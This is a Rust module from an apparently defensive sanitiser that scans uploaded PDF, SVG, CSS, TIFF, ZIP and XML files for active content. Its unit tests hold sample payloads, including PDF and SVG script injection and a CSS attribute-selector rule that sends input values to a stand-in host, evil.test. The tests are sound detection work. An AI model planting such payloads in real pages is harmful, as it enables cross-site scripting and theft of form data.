mod css;
mod pdf;
mod svg;
mod tiff;

use crate::policy::{Action, ActiveContentAction, SubresourcesRules};
use crate::report::{Location, MAX_FRAGMENT_BYTES, SanitisationAction, truncate_fragment};
use crate::scan::dos::xml::xml_has_active_content;
use crate::scan::dos::zip::zip_has_active_content;
use crate::sniff::{MimeType, SniffOutcome};
use css::{css_has_active_content, sanitize_css};
use pdf::{pdf_has_active_content, sanitize_pdf};
use svg::{sanitize_svg, svg_has_active_content};
use tiff::{rewrite_tiff, tiff_has_structural_risk};

pub struct ScanOutcome {
    pub output: Option<Vec<u8>>,
    pub actions: Vec<SanitisationAction>,
    pub refused: bool,
}

pub fn scan_active_content(input: SniffOutcome, rules: &SubresourcesRules) -> ScanOutcome {
    let mime_type = input.mime_type();
    let data = input.data;

    let detected_actions: Vec<SanitisationAction> = match mime_type {
        // script has no sanitised form
        Some(MimeType::TextJavascript) => {
            vec![single_action("scan.script.active_type", 0, &data)]
        }
        Some(MimeType::ApplicationPdf) => pdf_has_active_content(&data)
            .map(|o| vec![single_action("scan.pdf.active_content", o, &data)])
            .unwrap_or_default(),
        Some(MimeType::ImageTiff) => tiff_has_structural_risk(&data)
            .map(|o| vec![single_action("scan.tiff.structural_risk", o, &data)])
            .unwrap_or_default(),
        Some(MimeType::ApplicationZip) => zip_has_active_content(&data, &rules.zip_budget)
            .map(|o| vec![single_action("scan.zip.macro_present", o, &data)])
            .unwrap_or_default(),
        Some(MimeType::ApplicationXml) => xml_has_active_content(&data)
            .map(|o| vec![single_action("scan.xml.xxe", o, &data)])
            .unwrap_or_default(),
        Some(MimeType::ImageSvg) => svg_has_active_content(&data),
        Some(MimeType::TextCss) => css_has_active_content(&data),
        _ => Vec::new(),
    };

    if detected_actions.is_empty() {
        return ScanOutcome {
            output: Some(data),
            actions: Vec::new(),
            refused: false,
        };
    }

    let policy_action = match rules.active_content_rule {
        ActiveContentAction::Allow => Action::Allow,
        ActiveContentAction::Reject => Action::Refuse,
    };
    let refused = policy_action == Action::Refuse;

    let actions = detected_actions
        .into_iter()
        .map(|a| SanitisationAction {
            action: policy_action,
            ..a
        })
        .collect();

    let output = if refused {
        None
    } else {
        Some(rewrite_if_possible(mime_type, data))
    };

    ScanOutcome {
        output,
        actions,
        refused,
    }
}

/// Best-effort sanitisation for `Allow` under `active_content_rule`: rewrites
/// the input when a format-specific rewrite exists, otherwise passes the
/// original bytes through unchanged (the active content stays present —
/// see caveats in the project report for formats without a rewrite path).
fn rewrite_if_possible(mime_type: Option<MimeType>, data: Vec<u8>) -> Vec<u8> {
    match mime_type {
        Some(MimeType::ApplicationPdf) => sanitize_pdf(&data).unwrap_or(data),
        Some(MimeType::ImageTiff) => rewrite_tiff(data),
        Some(MimeType::ImageSvg) => sanitize_svg(&data),
        Some(MimeType::TextCss) => sanitize_css(&data),
        _ => data,
    }
}

fn single_action(rule_id: &str, offset: usize, data: &[u8]) -> SanitisationAction {
    located_action(rule_id, 0, offset, data)
}

/// Same, for a scanner that knows which line the construct sits on.
pub(super) fn located_action(
    rule_id: &str,
    line: u64,
    offset: usize,
    data: &[u8],
) -> SanitisationAction {
    let fragment_end = (offset + MAX_FRAGMENT_BYTES).min(data.len());
    SanitisationAction {
        rule_id: rule_id.to_string(),
        category: "active_content".to_string(),
        location: Location {
            line,
            byte_offset: offset as u64,
        },
        original: truncate_fragment(
            &String::from_utf8_lossy(&data[offset..fragment_end]),
            MAX_FRAGMENT_BYTES,
        ),
        action: Action::Allow, // placeholder
        replacement: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::ActiveContentAction;
    use crate::sniff::MimeVerdict;

    fn default_rules() -> SubresourcesRules {
        SubresourcesRules::default()
    }

    fn allow_rules() -> SubresourcesRules {
        SubresourcesRules {
            active_content_rule: ActiveContentAction::Allow,
            ..Default::default()
        }
    }

    fn reject_rules() -> SubresourcesRules {
        SubresourcesRules {
            active_content_rule: ActiveContentAction::Reject,
            ..Default::default()
        }
    }

    fn sniff_outcome(mime_type: Option<MimeType>, data: Vec<u8>) -> SniffOutcome {
        SniffOutcome {
            data,
            verdict: MimeVerdict {
                declared: None,
                sniffed: mime_type,
            },
            actions: Vec::new(),
        }
    }

    fn declared_outcome(mime_type: MimeType, data: Vec<u8>) -> SniffOutcome {
        SniffOutcome {
            data,
            verdict: MimeVerdict {
                declared: Some(mime_type),
                sniffed: None,
            },
            actions: Vec::new(),
        }
    }

    #[test]
    fn clean_content_returns_output_with_no_actions() {
        let data = vec![1, 2, 3, 4, 5];
        let outcome = sniff_outcome(None, data.clone());
        let rules = default_rules();

        let result = scan_active_content(outcome, &rules);

        assert_eq!(result.output, Some(data));
        assert!(result.actions.is_empty());
        assert!(!result.refused);
    }

    #[test]
    fn unsupported_mime_type_returns_clean() {
        let data = vec![1, 2, 3];
        let outcome = sniff_outcome(Some(MimeType::TextHtml), data.clone());
        let rules = default_rules();

        let result = scan_active_content(outcome, &rules);

        assert_eq!(result.output, Some(data));
        assert!(result.actions.is_empty());
        assert!(!result.refused);
    }

    #[test]
    fn none_mime_type_returns_clean() {
        let data = vec![1, 2, 3];
        let outcome = sniff_outcome(None, data.clone());
        let rules = default_rules();

        let result = scan_active_content(outcome, &rules);

        assert_eq!(result.output, Some(data));
        assert!(result.actions.is_empty());
        assert!(!result.refused);
    }

    #[test]
    fn pdf_with_active_content_reject_policy() {
        let data =
            b"%PDF-1.7\n3 0 obj\n<< /S /JavaScript /JS (app.alert('hi');) >>\nendobj".to_vec();
        let outcome = sniff_outcome(Some(MimeType::ApplicationPdf), data);
        let rules = reject_rules();

        let result = scan_active_content(outcome, &rules);

        assert!(result.refused);
        assert_eq!(result.output, None);
        assert_eq!(result.actions.len(), 1);
        assert_eq!(result.actions[0].rule_id, "scan.pdf.active_content");
        assert_eq!(result.actions[0].action, Action::Refuse);
        assert_eq!(result.actions[0].category, "active_content");
    }

    #[test]
    fn pdf_with_active_content_allow_policy() {
        let data =
            b"%PDF-1.7\n3 0 obj\n<< /S /JavaScript /JS (app.alert('hi');) >>\nendobj".to_vec();
        let outcome = sniff_outcome(Some(MimeType::ApplicationPdf), data.clone());
        let rules = allow_rules();

        let result = scan_active_content(outcome, &rules);

        assert!(!result.refused);
        assert_eq!(result.output, Some(data));
        assert_eq!(result.actions.len(), 1);
        assert_eq!(result.actions[0].rule_id, "scan.pdf.active_content");
        assert_eq!(result.actions[0].action, Action::Allow);
    }

    #[test]
    fn clean_pdf_has_no_actions() {
        let data = b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n%%EOF".to_vec();
        let outcome = sniff_outcome(Some(MimeType::ApplicationPdf), data.clone());
        let rules = default_rules();

        let result = scan_active_content(outcome, &rules);

        assert_eq!(result.output, Some(data));
        assert!(result.actions.is_empty());
        assert!(!result.refused);
    }

    #[test]
    fn svg_with_active_content_detected() {
        // SVG with script tag
        let data = b"<svg><script>alert('xss')</script></svg>".to_vec();
        let outcome = sniff_outcome(Some(MimeType::ImageSvg), data);
        let rules = reject_rules();

        let result = scan_active_content(outcome, &rules);

        assert!(result.refused);
        assert_eq!(result.output, None);
        assert!(!result.actions.is_empty());
    }

    #[test]
    fn clean_svg_has_no_actions() {
        let data = b"<svg><circle cx='50' cy='50' r='40'/></svg>".to_vec();
        let outcome = sniff_outcome(Some(MimeType::ImageSvg), data.clone());
        let rules = default_rules();

        let result = scan_active_content(outcome, &rules);

        assert_eq!(result.output, Some(data));
        assert!(result.actions.is_empty());
        assert!(!result.refused);
    }

    #[test]
    fn empty_input_is_handled() {
        let data = Vec::new();
        let outcome = sniff_outcome(Some(MimeType::ApplicationPdf), data);
        let rules = default_rules();

        let result = scan_active_content(outcome, &rules);

        assert_eq!(result.output, Some(Vec::new()));
        assert!(result.actions.is_empty());
    }

    #[test]
    fn a_script_body_is_active_by_its_type() {
        let data = b"This is just plain text, not JavaScript code.".to_vec();
        let outcome = declared_outcome(MimeType::TextJavascript, data);

        let result = scan_active_content(outcome, &reject_rules());

        assert!(result.refused);
        assert_eq!(result.output, None);
        assert_eq!(result.actions.len(), 1);
        assert_eq!(result.actions[0].rule_id, "scan.script.active_type");
        assert_eq!(result.actions[0].action, Action::Refuse);
        assert!(result.actions[0].original.starts_with("This is just"));
    }

    #[test]
    fn a_script_body_survives_under_allow() {
        let data = b"alert(1)".to_vec();
        let outcome = declared_outcome(MimeType::TextJavascript, data.clone());

        let result = scan_active_content(outcome, &allow_rules());

        assert!(!result.refused);
        assert_eq!(result.output, Some(data));
        assert_eq!(result.actions[0].action, Action::Allow);
    }

    #[test]
    fn an_empty_script_body_is_still_refused() {
        let outcome = declared_outcome(MimeType::TextJavascript, Vec::new());
        let result = scan_active_content(outcome, &reject_rules());
        assert!(result.refused);
        assert_eq!(result.actions[0].original, "");
    }

    const MALICIOUS_CSS: &[u8] = br#"body { background: url("javascript:alert(1)") }
@import "http://evil.test/x.css";
input[value^='a'] { background: url('http://evil.test/?v=a') }
p { color: red }"#;

    #[test]
    fn a_malicious_stylesheet_is_refused() {
        let outcome = declared_outcome(MimeType::TextCss, MALICIOUS_CSS.to_vec());
        let result = scan_active_content(outcome, &reject_rules());

        assert!(result.refused);
        assert_eq!(result.output, None);
        let ids: Vec<&str> = result.actions.iter().map(|a| a.rule_id.as_str()).collect();
        assert!(ids.contains(&"scan.css.dangerous_scheme"));
        assert!(ids.contains(&"scan.css.import"));
        assert!(ids.contains(&"scan.css.exfiltration"));
        assert!(result.actions.iter().all(|a| a.action == Action::Refuse));
    }

    #[test]
    fn a_malicious_stylesheet_is_stripped_under_allow() {
        let outcome = declared_outcome(MimeType::TextCss, MALICIOUS_CSS.to_vec());
        let result = scan_active_content(outcome, &allow_rules());

        assert!(!result.refused);
        let out = String::from_utf8(result.output.unwrap()).unwrap();
        assert!(!out.contains("javascript:"));
        assert!(!out.contains("@import"));
        assert!(!out.contains("evil.test"));
        assert!(out.contains("p { color: red }"));
    }

    #[test]
    fn a_stylesheet_is_not_active_by_type() {
        let data = b"body{}".to_vec();
        let result = scan_active_content(
            declared_outcome(MimeType::TextCss, data.clone()),
            &reject_rules(),
        );
        assert!(!result.refused);
        assert_eq!(result.output, Some(data));
    }

    #[test]
    fn action_has_correct_location() {
        let data = b"prefixAAAA/JavaScript/suffix".to_vec();
        let outcome = sniff_outcome(Some(MimeType::ApplicationPdf), data);
        let rules = default_rules();

        let result = scan_active_content(outcome, &rules);

        if let Some(action) = result.actions.first() {
            assert_eq!(action.category, "active_content");
            assert_eq!(action.location.line, 0);
            assert!(action.location.byte_offset > 0);
        }
    }

    #[test]
    fn multiple_actions_policy_updated() {
        // SVG can produce multiple actions (e.g., script + event handler)
        let data = b"<svg><script>alert('xss')</script><circle onclick='hack()'/></svg>".to_vec();
        let outcome = sniff_outcome(Some(MimeType::ImageSvg), data.clone());
        let rules = allow_rules();

        let result = scan_active_content(outcome, &rules);

        // All actions should have the Allow policy applied
        for action in &result.actions {
            assert_eq!(action.action, Action::Allow);
        }
        assert!(!result.refused);
        assert_eq!(result.output, Some(data));
    }

    #[test]
    fn single_action_creates_correct_sanitisation_action() {
        let data = b"test/JavaScripttest";
        let offset = 5;
        let action = single_action("test.rule", offset, data);

        assert_eq!(action.rule_id, "test.rule");
        assert_eq!(action.category, "active_content");
        assert_eq!(action.location.line, 0);
        assert_eq!(action.location.byte_offset, 5);
        assert_eq!(action.action, Action::Allow);
        assert_eq!(action.replacement, None);
    }

    #[test]
    fn single_action_truncates_long_fragments() {
        let long_data = vec![b'A'; 1000];
        let action = single_action("test.rule", 0, &long_data);

        // original should be truncated to MAX_FRAGMENT_BYTES or less
        assert!(action.original.len() <= MAX_FRAGMENT_BYTES);
    }
}
